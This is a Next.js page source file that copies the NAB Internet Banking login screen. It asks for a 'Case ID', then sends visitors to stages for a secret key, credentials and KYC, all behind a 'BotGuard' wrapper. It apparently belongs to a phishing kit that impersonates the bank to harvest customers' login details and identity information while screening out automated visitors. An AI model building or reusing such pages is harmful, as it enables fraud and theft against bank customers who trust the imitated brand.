'use client';

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="card-heading">NAB Internet Banking</h1>
        <form className="login-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="case-id">Case ID</label>
            <input
              type="text"
              id="case-id"
              name="case-id"
              autoComplete="off"
              value={caseId}
              onChange={(e) => {
                setCaseId(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isLoading}
            />
          </div>

          {fieldError && (
            <div className="form-group">
              <div style={{ color: '#C20000', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px' }}>
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            </div>
          )}

          <div className="form-actions">
            <button type="submit" className="btn-login" disabled={isLoading}>
              {isLoading ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Loader2 className="h-4 w-4 animate-spin" /> Processing...
                </span>
              ) : 'Continue'}
            </button>
          </div>

          <div className="form-links">
            {/* Optional link or text - kept empty as per current implementation or can match reference if needed. Reference has forgot link. Current didn't. */}
          </div>
        </form>

        <div className="card-footer">
          <p>New to NAB Internet Banking?</p>
          <a href="#" className="register-link">Register now</a>
        </div>
      </div>

      <div className="promo-section">
        <div className="promo-content">
          <h2>$0 monthly account fees</h2>
          <p>More money in your pocket to enjoy what you really love with a NAB Classic Banking account.</p>
          <p className="small-text">Consider the terms and conditions & TMD.</p>
          <a href="#" className="btn-learn-more">Learn more</a>
        </div>
        <div className="promo-image">
          <img src="/brands/nab/red-star-decorative-iblogout-500x500.avif" alt="NAB Star" />
        </div>
      </div>
    </BotGuard>
  );
}
